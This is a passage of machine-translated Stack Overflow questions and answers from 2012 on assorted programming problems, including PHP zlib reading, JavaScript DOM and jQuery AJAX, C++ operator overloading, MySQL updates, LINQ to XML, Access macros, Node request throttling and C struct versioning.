此外，Apple 建议仅在您确实需要知道时才打开此功能。所以它应该只在游戏过程中被激活，而不是在时间不敏感的菜单上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:40:12.533

多谢你们。然而，问题出在其他地方。这恰好是我在恢复时检查的标志之一的问题。当用户开始新游戏时它应该被重置，我没有这样做。

经验教训：对全局变量要格外小心 :) [我尽量避免使用它们]

感谢您的回复和回答。再次感谢。

# php - gzgets 提前到达文件末尾

> ID：11235123
> 
> 赞同：2
> 
> 时间：2012-06-27T21:34:12.493
> 
> 标签：php, zlib

我有一个压缩文本文件，我试图在 PHP 中读取（使用 gzopen/gzgets）。该文件有点大，大约 158,000 行。该脚本工作正常，除非当它到达文件的第 157,237 行时，它会读取该行的一部分，然后就像到达 EOF 一样。我能够解压缩文件并确认文件的其余部分确实存在。我写了一个简单的脚本来测试：

```
<?php
    $handle = gzopen('/path/to/file.gz','r');
    while(true) {
        echo gzgets($handle,4096);
    }
?> 
```

它完美地读取了所有内容，然后突然到达这一行并打印：

```
GUAN XIN 508|R34745|CH|CGO|100| 
```

没有别的了。它只是坐在那里[非无限循环版本退出 while(!gzeof($handle))]

如果我将文件压缩并转到该行，我会看到：

```
GUAN XIN 508|R34745|CH|CGO|100| | | | |BEGS| | | | |133|19| | | | | | | | | | | | |413669000|1| 
```

所以数据就在那里。我不知道的 zlib 函数是否存在某种大小限制？

更新：我通过'cat -vet'运行它来寻找特殊字符......什么都没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T14:50:43.680

将 zlib 更新到 1.2.7。我们运行的是 1.2.3，显然在 1.2.4 中添加了“大文件”支持。

# javascript - Javascript document.getElementsByClassName 返回未定义

> ID：11235127
> 
> 赞同：6
> 
> 时间：2012-06-27T21:34:57.570
> 
> 标签：javascript, html

我有一个功能应该相当简单，应该在加载后完成，以减少初始加载时间。

基本上我正在使用这段代码来获取类“prefImg”的所有元素并用它们做一些事情。但是在 firebug 中调试时，它说 var divsList 是未定义的。

```
function populatePrefsList()
    {
        var divsList = new Array();
        divsList = document.getElementsByClassName("prefImg");
        var x = divsList.length;
        var i = 0;
        for(i=0; i<divsList.length; i++) {
            var imgs = divsList[i].getElementsByTagName("img");
            var imgSRC = imgs[0].src;
            var alt = imgs[0].alt;
            var descs = divsList[i].getElementsByTagName("h4");
            var desc = descs[0].innerHTML;
            //var thisPref = new preference(imgSRC, alt, desc);
            //prefsList[i] = thisPref;
        }
    } 
```

显然我有断点`var x = divsList.length`...

我无法理解这一点，我最初将脚本放在页面的头部，但认为它可能尚未加载 div，已将其移至正文的底部。这并没有解决它。

我已经有了`var divsList = document.getElementsByClassName("prefImg");`

如果有人能告诉我哪里出错了，我将不胜感激。大约有 50 个带有 className 的 div `prefImg`。

干杯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T21:41:13.460

您可以使用 querySelectorAll 代替 getElementsByClassName：

改变`divsList = document.getElementsByClassName("prefImg");`

对此`divsList = document.querySelectorAll(".prefImg");`

**演示 - [http://jsfiddle.net/ya3gU/](http://jsfiddle.net/ya3gU/)**

顺便说一句，您不需要在设置数组 divsList 之前声明它。做就是了：

```
var divsList = document.querySelectorAll(".prefImg"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T23:09:12.183

不要在头部写这段代码..因为这意味着身体还没有加载。在你的身体标签的末尾做它或使用 -

`window.addEventListener("load", function() { // code here });`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T21:53:28.943

您可以对窗口对象的加载事件使用事件处理程序，仅在窗口完成加载时运行脚本

```
 function populatePrefsList()
  {
    var divsList = new Array();
    divsList = document.getElementsByClassName("prefImg");
    var x = divsList.length;
    var i = 0;
    for(i=0; i<divsList.length; i++) {
        var imgs = divsList[i].getElementsByTagName("img");
        var imgSRC = imgs[0].src;
        var alt = imgs[0].alt;
        var descs = divsList[i].getElementsByTagName("h4");
        var desc = descs[0].innerHTML;
        //var thisPref = new preference(imgSRC, alt, desc);
        //prefsList[i] = thisPref;
    }
}

 window.onload = function(){
 populatePrefsList();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T23:18:46.030

较旧的浏览器（如 IE6、IE7、IE8）不支持**getElementsByClassName**，因此它们返回`undefined`.

在较新的浏览器中，返回值是 never `undefined`。它主要是 a `HTMLCollection`（但在 W3C 规范之后它应该是 a `NodeList`）。

[https://developer.mozilla.org/en/DOM/document.getElementsByClassName](https://developer.mozilla.org/en/DOM/document.getElementsByClassName)

但我认为在你的情况下，真正的问题是 Firebug 中的一个错误：

[http://code.google.com/p/fbug/issues/detail?id=5336](http://code.google.com/p/fbug/issues/detail?id=5336)

它已修复并提交了一个补丁，并将成为**Firebug 1.10a6的一部分**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-23T07:06:30.940

因为它返回一个 HTMLCollection，所以你应该`[number]`在行尾添加一个：

```
divsList = document.getElementsByClassName("prefImg")[0]; 
```

此外，在所有内容完全加载后加载此函数也是一个好主意，方法是使用：

```
window.load = function() {
    populatePrefsList();
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-06-27T21:38:20.700

并非所有浏览器都支持...任何不支持它的浏览器，您都必须实现自己的。

```
function getElementsByClassName(node,classname) {
    if (node.getElementsByClassName)
        return node.getElementsByClassName(classname);
    else {
        // custom
    }
} 
```

# jquery - 获取一些刚刚发布的数据

> ID：11235132
> 
> 赞同：0
> 
> 时间：2012-06-27T21:35:42.400
> 
> 标签：jquery

我正在使用此代码发布一些数据

```
$('.update_btn').live("click",function() 
{
var ID = $(this).attr("id");
var dataString = 'msg_id='+ ID;

$.ajax({
type: "POST",
 url: "get-data.php",
 data: dataString,
 cache: false,
 success: function(){
 //alert(dataString);//is not empty
 getData();
 }
});
return false;
});

function getData()
{
   $.ajax({ 
      type: "GET",    
      url: 'get-data.php',                                                                   
      success: function()          
      {
      var jq = '<?php echo $_POST['msg_id'];?>';   
      alert(jq);      
      } 
    });
} 
```

和函数数据来检索刚刚发布的数据，但`var jq`没有发布数据。可能是什么原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:40:45.947

`success: function(r) { alert(r); }`

您正试图以一种非常奇怪的方式混合 PHP 和 JS。在您的 PHP AJAX 处理程序脚本中吐出发布的变量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T21:52:12.767

由于您使用的是 jQuery（或任何 JavaScript），因此您不会将 PHP 代码嵌入其中......

假设您只想返回 the`msg_id`而没有其他内容，您`get-data.php`将是这样的：

```
<?php
  // all the database work here to obtain the id..

  echo $data['msg_id'];
?> 
```

然后将您的 getData 函数变为：

```
function getData()
{
   $.ajax({ 
      type: "GET",    
      url: 'get-data.php',                                                                   
      success: function(jq)          
      {
      alert(jq);      
      } 
    });
} 
```

现在，扩展这一点——如果你的回报将是某种数组，你会想在你的 php 中使用 json_encode ......就像这样：

```
<?php
$data = mysqli_fetch_array(mysqli_query("SELECT * FROM table"), MYSQL_ASSOC);

echo json_encode($data);
?> 
```

从逻辑上讲，因为我们返回的是JavaScript，所以我们`json array`的 JavaScript 也会发生变化：

```
function getData()
{
   $.ajax({ 
      type: "GET",    
      url: 'get-data.php',                                                                   
      success: function(response)          
      {
      var jq = $.parseJSON(response);
      alert(jq.msg_id);      
      } 
    });
} 
```

两者之间没有太大区别。但希望这个答案能让您进一步了解您尝试使用的工具。如果您只用谷歌搜索它们，那里有很多 jQuery 教程。 .. 许多 JavaScript 顽固分子（包括我自己），都会敦促您学习 Native JavaScript，以便您了解 jQuery 幕后发生的事情。这是一个非常好的主意，如果你用谷歌搜索的话，还有很多关于它的信息和教程。

我相信有些人也有一些他们可以推荐给你阅读的书。

# c++ - 比较字符串输入与类数组值的问题 C++（Unix 环境）（家庭作业）

> ID：11235136
> 
> 赞同：1
> 
> 时间：2012-06-27T21:36:11.310
> 
> 标签：c++, arrays, unix

作业：编写一个 C++ 程序，从 menu.txt 中读取菜单信息。项目代码中的第一个字母指定它是开胃菜 (A)、主菜 (E)、甜点 (D) 还是饮料 (S)。

```
A1 Bruschetta 5.29
A2 Caprese_Flatbread 6.10
A3 Artichoke-Spinach_Dip 3.99
A4 Lasagna_Fritta 4.99
A5 Mozzarella_Fonduta 5.99
E1 Lasagna_Classico 6.99
E2 Capellini_Pomodoro 7.99
E3 Eggplant_Parmigiana 8.99
E4 Fettuccine_Alfredo 7.49
E5 Tour_of_Italy 14.99
D1 Tiramisu 2.99
D2 Zeppoli 2.49
D3 Dolcini 3.49
S1 Soda 1.99
S2 Bella_Limonata 0.99
S3 Berry_Acqua_Fresca 2.88 
```

然后提示用户输入订单。对于每个订单，您应该计算并输出总金额。项目可以在每一行中以任何顺序列出。

A1 E1 D1 S1 S2 D3 E4 A4 E3 E5 A2 A4 S2 S1 D2 D2 E2 X

一旦用户输入“X”，程序应该输出最受欢迎的开胃菜、主菜、甜点、饮料。如果有平局，您可以输出其中任何一个。

我遇到的问题是获取输入（例如，A1），然后解析数组以获取数组中的适当项目和位置（例如，A1 将是 test2[1]，E1 希望是 test2[5] ）。我知道数组已正确填充。我试图用来搜索数组的是：

```
for(int l = 0; l<SIZE; l++)
{   //I get an operator error every time here       
    if(s == (test2[l]))
    {   //Just a test to see if I am pulling 
        //any information                   
        cout << test2[l].getCode() << endl;
    }           
} 
```

测试被实例化为 MenuItem test2[SIZE]。

当我尝试使用上述方法时，我总是出错

's == test2[l]' 中的 'operator==' 不匹配</p>

下面是我的 MenuItem.h：

```
#ifndef MENUITEM_H
#define MENUITEM_H
#include <iostream>
#include <string>

using namespace std;

class MenuItem
{
private:
string code;
string name;
double price;

public:
MenuItem(string mcode = "", string mname = "", double mprice = 0);
~MenuItem();
string getCode() const { return code; }
string getName() const { return name; }
double getPrice() const { return price; }

void setCode(string mcode){ code = mcode; }
void setName(string mname){ name = mname; }
void setPrice(double mprice)  { price = mprice; }
};
#endif 
```

感谢您的任何帮助和意见。

真挚地，

杰森

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:40:18.720

好吧，如果您正在比较 MenuItem 类型的对象，那么您还没有完全实现 == 运算符。

在此处查找 C++ 中的运算符重载。

[http://courses.cms.caltech.edu/cs11/material/cpp/donnie/cpp-ops.html](http://courses.cms.caltech.edu/cs11/material/cpp/donnie/cpp-ops.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T01:27:03.770

我想知道以下代码中变量**s的类型是什么：**

```
if(s == (test2[l])) 
```

是一个包含用户输入的字符串，例如**。**“A1”？或者是**一个**MenuItem 对象？

如果它是一个字符串，那么条件就是

```
if(s == test[l].getCode()) 
```

如果**s**是 MenuItem 对象，那么您应该为 MenuItem 对象实现**operator==**

它的签名可能看起来像这样：

```
bool operator== (const MenuItem&, const MenuItem&); 
```

并且实现将涉及检查两个 MenuItem 对象是否具有相同的代码、名称和价格。

# mysql - 使用 UPDATE 功能批量更新记录

> ID：11235138
> 
> 赞同：0
> 
> 时间：2012-06-27T21:36:35.243
> 
> 标签：mysql, sql, phpmyadmin, forum

由于几个月前的事件，我的论坛数据库中删除了数千个 author_id，我正在寻找恢复它们。因为成千上万的帖子没有 author_id，所以帖子的原作者连同 Guest_ 前缀一起显示为灰色。

[论坛目前的样子。](http://i.minus.com/i068gx5HnGZvS.PNG)

[论坛应该是什么样子。](http://i.minus.com/if44R39TzsryN.PNG)

无论如何，[这是](http://i.minus.com/ibtzcXdX1rEy6.PNG)*Posts*表包含的列的图像。这是[索引](http://i.minus.com/iBTls0l3Zo2xI.PNG)的图像。

我的解决方案：

```
UPDATE posts
SET author_id = 375, author_name = 'Peter'
WHERE author_name = 'petersmileyface' 
```

以上是我尝试过的，但是当我执行代码时，所有 author_ids 都更改为 375，因此每个帖子都有一个 author_name 为“Peter”。w3schools 声明只有当我省略 WHERE 子句时，才会更新所有记录。

为什么我的解决方案不起作用？提前感谢您的回答。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:14:05.220

你的请求没有错，你一定是在执行过程中遗漏了什么。

对于批量更新，你可以使用另一种请求，带有CASE语句，试试吧，也许你不会再有问题了......

```
UPDATE posts 
SET 
   author_id = 
      CASE author_name 
         WHEN 'petersmileyface' THEN 375
         WHEN 'portugaltrollface' THEN 412
      END,
   author_name = 
      CASE author_name 
         WHEN 'petersmileyface' THEN 'Peter'
         WHEN 'portugaltrollface' THEN 'Pedro'
      END; 
```

# c# - 如何使用 linq to xml 获取此属性？

> ID：11235139
> 
> 赞同：1
> 
> 时间：2012-06-27T21:36:48.533
> 
> 标签：c#, .net, linq-to-xml

我有以下 XML：

```
<Result ID="1,New" xmlns="http://schemas.microsoft.com/sharepoint/soap/">
    <ErrorCode>0x00000000</ErrorCode>
    <ID />
    <z:row ows_ID="6" />
</Result> 
```

我一直在尝试`ows_ID`使用以下方法获取值：

```
XNamespace ns = "http://schemas.microsoft.com/sharepoint/soap/";
string newId = (from r in resDoc.Descendants(ns + "row")
               select (string)r.Attribute("ows_ID")).First(); 
```

它不返回任何记录，并且：

```
XNamespace ns = "http://schemas.microsoft.com/sharepoint/soap/";
string newId = (from r in resDoc.Descendants(ns + "z:row")
               select (string)r.Attribute("ows_ID")).First(); 
```

这会引发错误`:`

我获得这个值的正确方法是什么？

**更新 - 完整`z:row`节点**

```
<z:row ows_ContentTypeId="0x010090ADDB8ED990B741A07020AB204CDB880100311975766C6F0E4CBE4EBFBC3CBFD9AB" ows_Title="test 2 attachments343434" ows_AggregateDesc="&lt;div class=&quot;ExternalClass05363FABD7BB400483A6AE4BB3B9B6CE&quot;&gt;&lt;p&gt;yes?&lt;/p&gt;&lt;/div&gt;" ows_Remarks="&lt;div class=&quot;ExternalClassB63AA0BFC1804E24B10C9559D7FBEBA5&quot;&gt;&lt;p&gt;no?&lt;/p&gt;&lt;/div&gt;" ows_PublishDate="2012-06-15 12:00:00" ows_MemoStatus="Submitted" ows_ID="6" ows_ContentType="FridayMemo" ows_Modified="2012-06-27 14:00:47" ows_Created="2012-06-27 14:00:47" ows_Author="49;#Abe Miessler" ows_Editor="49;#Abe Miessler" ows_owshiddenversion="1" ows_WorkflowVersion="1" ows__UIVersion="512" ows__UIVersionString="1.0" ows_Attachments="0" ows__ModerationStatus="0" ows_LinkTitleNoMenu="test 2 attachments343434" ows_LinkTitle="test 2 attachments343434" ows_LinkTitle2="test 2 attachments343434" ows_SelectTitle="6" ows_Order="600.000000000000" ows_GUID="{393F36F5-FFA8-4F6E-A12A-1107AA713F25}" ows_FileRef="6;#nc/ceo/Lists/FridayMemo/6_.000" ows_FileDirRef="6;#nc/ceo/Lists/FridayMemo" ows_Last_x0020_Modified="6;#2012-06-27 14:00:47" ows_Created_x0020_Date="6;#2012-06-27 14:00:47" ows_FSObjType="6;#0" ows_SortBehavior="6;#0" ows_PermMask="0x7fffffffffffffff" ows_FileLeafRef="6;#6_.000" ows_UniqueId="6;#{F4C6B345-4590-4791-9384-18983132F055}" ows_ProgId="6;#" ows_ScopeId="6;#{8450C4BD-0866-40ED-A0CD-22E3105E0845}" ows__EditMenuTableStart="6_.000" ows__EditMenuTableStart2="6" ows__EditMenuTableEnd="6" ows_LinkFilenameNoMenu="6_.000" ows_LinkFilename="6_.000" ows_LinkFilename2="6_.000" ows_ServerUrl="/nc/ceo/Lists/FridayMemo/6_.000" ows_EncodedAbsUrl="http://sptestmnc.nevcounty.net/nc/ceo/Lists/FridayMemo/6_.000" ows_BaseName="6_" ows_MetaInfo="6;#" ows__Level="1" ows__IsCurrentVersion="1" ows_ItemChildCount="6;#0" ows_FolderChildCount="6;#0" 
  xmlns:z="#RowsetSchema" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T01:13:10.800

```
 var ns = XNamespace.Get("#RowsetSchema");
    var id = xml
      .Descendants(ns + "row")
      .Select(row => row.Attribute("ows_ID").Value)
      .First(); 
```

或者

```
 var ns = XNamespace.Get("#RowsetSchema");
    var id = xml
      .Descendants(ns + "row")
      .First()
      .Attribute("ows_ID")
      .Value; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:06:52.800

您没有为该`Descendants`方法正确指定命名空间。它需要一个`XName`（它提供了一个字符串的隐式转换，让你误以为它需要一个字符串）。您可以使用`Get(string,string)`静态方法`XName`来指定命名空间：

```
string ns = "http://schemas.microsoft.com/sharepoint/soap/";
string newId = (from r in resDoc.Descendants(XName.Get("row",ns))
    select (string)r.Attribute("ows_ID")).First(); 
```

根据 OP 的要求，这是我编写的完整示例代码，可在 LINQPad 中编译并正常工作：

```
var ns = "http://schemas.microsoft.com/sharepoint/soap/";
var xml = 
    @"<Result ID=""1,New"" xmlns=""" + ns + @""">" +
        @"<ErrorCode>0x00000000</ErrorCode>" +
        @"<ID />" +
        @"<z:row ows_ID=""6"" />" +
    @"</Result>";

XmlNamespaceManager mgr = new XmlNamespaceManager(new NameTable());
mgr.AddNamespace("z", "http://schemas.microsoft.com/sharepoint/soap/");
XmlParserContext ctx = new XmlParserContext(null, mgr, null, XmlSpace.Default);
XDocument resDoc;
using( XmlReader reader = XmlReader.Create(new StringReader(xml), null, ctx) ) {
    resDoc = XDocument.Load(reader);
}

string newId = (from r in resDoc.Descendants(XName.Get("row",ns))
    select (string)r.Attribute("ows_ID")).First();

Console.WriteLine( newId );     // prints "6" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T21:47:15.053

您必须使用“z”命名空间，该命名空间必须在此代码中未显示的某处定义才能访问该元素，您正在使用的就是您为根元素设置的那个。

# sql - 访问 2010 Me.Refresh/Me.Requery

> ID：11235140
> 
> 赞同：1
> 
> 时间：2012-06-27T21:36:54.620
> 
> 标签：sql, ms-access

我有一个表单，我想在单击提交按钮时刷新。最好是那些具有默认值的将被恢复，而那些没有的将是空白的。

提交按钮有一个附加的 OnClick 宏，它会检查以确保所有字段都已填充，如果是这样，则会运行将新行插入表中的操作查询。

因此，在此操作查询之后，我希望进行刷新。我曾尝试研究并遇到建议使用 VBA 代码 Me.Requery 或 Me.Refresh 的建议。我不是 100% 知道如何将其合并到宏中。RunCode 命令无法识别我放入代码的函数，并且左上角的将宏转换为 VBA 选项是灰色的。

我是 Access 的新手，只是没有看到代码和宏的通信在哪里，如果有人可以为我详细说明，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:40:14.637

Requery 命令可以在`VBA`代码或宏中使用。听起来您正在使用宏设计器，因此您可以使用`Requery`宏操作而不是`VBA`.

插入新数据后，只需将其添加到宏中即可。

![在此处输入图像描述](../Images/92520a4a523b3845fce1df67f08291bf.png)

此宏操作允许您指定要重新查询的控件。该参数可以留空以重新查询活动对象的来源。更多信息可以在[这里](http://msdn.microsoft.com/en-us/library/bb177360%28v=office.12%29.aspx)找到。

**编辑**

针对您的评论，我认为您应该尝试使用`SetProperty`宏操作（更多详细信息请[点击此处](http://msdn.microsoft.com/en-us/library/bb177424%28v=office.12%29.aspx)）。

![在此处输入图像描述](../Images/a22643f8b9df8610382c5a94a2e4882c.png)

我已将此宏附加到按钮单击事件，并清除了名为*txtInputValue的 TextBox 中的值。*值字段留空，因为您想从文本框中完全删除值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:40:17.200

请考虑我的解决方案作为对 VBA 的简要介绍。如果你关心学习这门语言，你会发现几乎没有什么是你做不到的。

在您的提交按钮属性中，应该有一个“事件”选项卡。在此选项卡中，应将 On Click 设置为 [Event Procedure]。单击右侧的三个点按钮，它将启动 VBA 编辑器。

在 Private Sub 和 End Sub 行之间，您需要的只是这些代码行：

```
DoCmd.RunMacro ("Mac_1")
Me.TextBox1.Value = "Null"
Me.CombBox1.Value = "Null"
Me.Refresh

MsgBox "Your Save Was Successful.", vbOKOnly, "Saved" 
```

“Mac_1”是您要执行的宏的名称。ME.Refresh 在 mac_1 完成后立即执行，并将刷新页面。请务必将其括在正确的引号 (") 中，而不是双引号 ('')。

# php - 延迟加载 AJAX？

> ID：11235142
> 
> 赞同：2
> 
> 时间：2012-06-27T21:36:58.047
> 
> 标签：php, jquery, ajax

我正在编写一个基于 PHP 的在线幻想宠物模拟游戏。我对AJAX不是很熟悉，所以在回答时请记住这一点。

在宠物页面上，我希望用户能够在不需要重新加载整个页面的情况下给宠物喂食/饮水/玩耍 - 这就是我使用 AJAX 的原因。这是我到目前为止所拥有的：

**工作脚本**

```
$(function() {

$(".petcareFood").click(function(event) {
    event.preventDefault();
    $("#petcareFood").load($(this).attr("href"));
});

});

$(function() {

$(".petcareWater").click(function(event) {
    event.preventDefault();
    $("#petcareWater").load($(this).attr("href"));
});

});

$(function() {

$(".petcarePlay").click(function(event) {
    event.preventDefault();
    $("#petcarePlay").load($(this).attr("href"));
});

});
</script> 
```

**工作 HTML**

```
<a class=\"petcareFood\" href=\"petcare.php?pet=#&action=#\">Feed Your Pet</a>
<a class=\"petcareWater\" href=\"petcare.php?pet=#&action=#\">Water Your Pet</a>
<a class=\"petcarePlay\" href=\"petcare.php?pet=#&action=#\">Play With Your Pet</a> 
```

现在，我上面列出的一切都像一个魅力！*这*是我的问题：我希望这些链接也更新另一个 DIV - 包含更新状态栏的那个，显示他们的宠物有多饿/渴/不开心。目前，我正在这样做：

***几乎可以*工作的脚本**

```
$(function() {

$(".petcareFood").click(function(event) {
    event.preventDefault();
    $('#petcareHunger').load('ajax/hunger.php?pet=#');
});

});

$(function() {

$(".petcareWater").click(function(event) {
    event.preventDefault();
    $('#petcareThirst').load('ajax/thirst.php?pet=#');
});

});

$(function() {

$(".petcarePlay").click(function(event) {
    event.preventDefault();
    $('#petcareMood').load('ajax/mood.php?pet=#');
});

}); 
```

上面的脚本使得当用户单击其中一个 HTML 链接时，它会更新两个 DIVS（一个 DIV 包含用户喂食/饮水/与宠物玩耍时显示的消息，另一个包含状态栏）。现在...*看起来*一切都很好，但是...如果两个脚本同时更新，则处理状态栏的 PHP 不会更新 - 它仍在检索旧信息。

我对你们所有人的问题是：有什么方法可以延迟运行第二组脚本（以便在 PHP 对 MySQL 进行更改后它会更新）？

我尝试在“几乎可以工作的脚本”之前插入它：

```
setTimeout(function() {
$('#petcareMood').load('ajax/mood.php?pet=#');
}, 2000); 
```

但是，它不起作用。嗯 - 它确实，但只有一次。用户每天至少需要和他们的宠物一起玩 3 次才能获得 100% 的快乐，因此仅将第二个 DIV 延迟一次对我来说并不合适。当我尝试多次添加相同的脚本时，它就停止了一起工作。我能做些什么？！

如果您想查看运行情况的屏幕截图，请询问。我很乐意应要求提供。

先感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:42:28.517

您也许可以使用第一个 ajax 操作的回调函数，而不是硬编码的延迟时间：

```
//trigger first ajax
$("#petcarePlay").load($(this).attr("href"), function(){
  //trigger second ajax call, when first is completed
  $('#petcareHunger').load('ajax/hunger.php?pet=#');
}); 
```

见[http://api.jquery.com/load/](http://api.jquery.com/load/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T21:43:21.943

您可以使用该`complete`参数指定在请求完成时执行的回调函数。然后在回调中，执行另一个实际更新 div 的请求。

例子：

```
$(".petcareWater").click(function(event) {
    event.preventDefault();
    $("#petcareWater").load($(this).attr("href"), function(response, status, xhr) {
        // code here to make another request for stats
    }
}); 
```

或者，您可以让初始 URL 返回一些包含更新的统计信息的 JSON 数据，这样当一个人对宠物/与他们的宠物做某事时，它会返回所有统计信息，这样您就可以通过一次调用立即更新 div 的所有内容，而不必进行对数据的二次调用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T21:43:27.623

我不确定，但我认为 ajax 构造函数更适合您的目的 [http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)。

在那里您可以设置 AJAX 将是同步的（它将等待完成 AJAX 回调）

这里有一些关于它的理论:)

[http://javascript.about.com/od/ajax/a/ajaxasyn.htm](http://javascript.about.com/od/ajax/a/ajaxasyn.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T21:40:14.523

而不是`setTimeout`，使用[setInterval](https://developer.mozilla.org/en/window.setInterval)。当不再需要它时，您可以使用[clearInterval](https://developer.mozilla.org/en/DOM/window.clearInterval)杀死它。

`setInterval``n`将每毫秒执行一个给定的函数。

# javascript - 阻止代理使用的套接字

> ID：11235143
> 
> 赞同：0
> 
> 时间：2012-06-27T21:36:58.343
> 
> 标签：javascript, node.js

我正在抓取一个 API。有很多很多的请求。如果我做了太多请求，API 一开始看起来很可疑，我得到一堆 503。没关系，当我得到 503 时，我在重新运行请求之前设置了一个计时器，这个计时器由两个用于同一请求的每个 503。

但它不起作用。因为我的计时器是异步的。当我得到 503 时，在启动此计时器后，Node 立即将套接字重用于挂起的请求。所以我的计时器基本上不会改变任何东西。

我怎样才能防止这种情况？

到目前为止我所尝试的：

*   `settimeout`在重新启动请求之前使用
*   使用`sync`模块，它的`pause`（不起作用，因为光纤是异步的

任何的想法 ？:<

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T13:47:04.690

我终于得出结论，目前不可能。

为了防止大规模泛滥，我使用了模块的`queue`对象。`async`代码是这样的：

```
var queue = new Sync.Queue( function ( task, markAsComplete ) {
  Http.request( {
    agent : false, // we will use our own rate limiter, so we don't need agents
    ...
  }, function ( err, res ) {
    res.on( 'end', function ( ) {
      if ( IS_503 ) {
        var originalConcurrency = queue.concurrency; // saving the original concurrency
        queue.concurrency = 1;                       // our timeout will now stop every request
        setTimeout( function ( ) {
          queue.concurrency = originalConcurrency;   // restoring the concurrency
          queue.push( task );
          markAsComplete( );
        }, 1000 );
      }
    } );
  } );
}, numberOfParallelRequests ); 
```

# c - 生成结构定义的版本 ID？

> ID：11235146
> 
> 赞同：5
> 
> 时间：2012-06-27T21:37:15.103
> 
> 标签：c, gcc, clang

基本上，我想要的是某种与结构的确切定义相关联的编译时生成的版本。如果结构的定义以任何方式发生变化（添加、移动、*可能*重命名字段），我也希望该版本也发生变化。

在读取先前序列化的结构时，这样的版本常量将很有用，以确保它仍然兼容。另一种方法是手动跟踪手动指定的常量，如果忘记递增它（反序列化会产生垃圾），这可能会产生混乱的影响，并且还会提出何时准确递增它的问题（在开发和测试期间，或仅在某种情况下）释放）。

这可以通过使用外部工具在结构定义上生成哈希来实现，但我想知道 C 编译器（和/或它的预处理器）本身是否有可能。

这实际上是某种形式的内省，所以我怀疑这在 ANSI C 中可能根本不可能，但我会对一个适用于 gcc 和 clang 的解决方案感到满意。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:00:09.107

没有什么可以自动完成，但是您可以构建一些合理可靠地工作的东西：您可以使用`sizeof`and `offsetof`，并以这样一种方式组合它们，即您组合它们的顺序很重要。这是一个例子：

```
#include <stdio.h>
#include <stddef.h>

#define COMBINE2(a,b) ((a)*31+(b)*11)
#define COMBINE3(a,b,c) COMBINE2(COMBINE2(a,b),c)
#define COMBINE4(a,b,c,d) COMBINE2(COMBINE3(a,b,c),d)

typedef struct A {
    int a1;
    char a2;
    float a3;
} A;

typedef struct B {
    int b1;
    char b2;
    double b3;
} B;

typedef struct C {
    char c2;
    int c1;
    float c3;
} C;

typedef struct D {
    int d1;
    char d2;
    float d3;
    int forgotten[2];
} D;

int main(void) {
    size_t aSign = COMBINE4(sizeof(A), offsetof(A,a1), offsetof(A,a2), offsetof(A,a3));
    size_t bSign = COMBINE4(sizeof(B), offsetof(B,b1), offsetof(B,b2), offsetof(B,b3));
    size_t cSign = COMBINE4(sizeof(C), offsetof(C,c1), offsetof(C,c2), offsetof(C,c3));
    size_t dSign = COMBINE4(sizeof(D), offsetof(D,d1), offsetof(D,d2), offsetof(D,d3));
    printf("%ld %ld %ld %ld", aSign, bSign, cSign, dSign);
    return 0;
} 
```

此代码[打印](http://ideone.com/LSDFF)

```
358944 478108 399864 597272 
```

如您所见，此代码为每个结构生成运行时常量，这些结构对不同长度的字段的重新排序和更改字段的类型做出反应。即使您忘记更新计算所基于的字段列表，它也会对添加字段做出反应，这应该会产生某种安全网。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T21:41:22.070

Windows API 过去（现在仍然如此？）有一个 size 成员作为结构的第一个成员之一，因此它知道它正在传递的结构的版本（参见[`WNDCLASSEX`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633577%28v=vs.85%29.aspx)示例）：

```
struct Foo
{
    size_t size;
    char *bar;
    char *baz;
    /* Other fields */
}; 
```

在打电话给你设置大小之前`sizeof`：

```
struct Foo f;

f.size = sizeof(struct Foo);
f.bar = strdup("hi");
f.baz = strdup("there");

somefunc(&f); 
```

然后`somefunc`会根据`size`成员知道它正在处理哪个版本的结构。因为`sizeof`在编译时而不是运行时进行评估，这允许向后 ABI 兼容性。

# android - 将预定义消息插入现有对话 (Android)

> ID：11235147
> 
> 赞同：0
> 
> 时间：2012-06-27T21:37:18.413
> 
> 标签：android, sms, broadcastreceiver

有什么方法可以从基于 Android 平台构建的应用程序将预定义消息插入到收件箱中的现有对话中？

使用此代码，我可以检索最后发送和接收的消息。

```
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
TextView tv = new TextView(this);

Uri uriSMS = Uri.parse("content://sms/");
Cursor cur = getContentResolver().query(uriSMS, null, null, null, null);
cur.moveToNext();

String body = cur.getString(cur.getColumnIndex("body"));   
String add = cur.getString(cur.getColumnIndex("address"));
String time = cur.getString(cur.getColumnIndex("date"));
String protocol = cur.getString(cur.getColumnIndex("protocol"));       

String contactName = "";
Uri personUri = Uri.withAppendedPath( ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(add));  
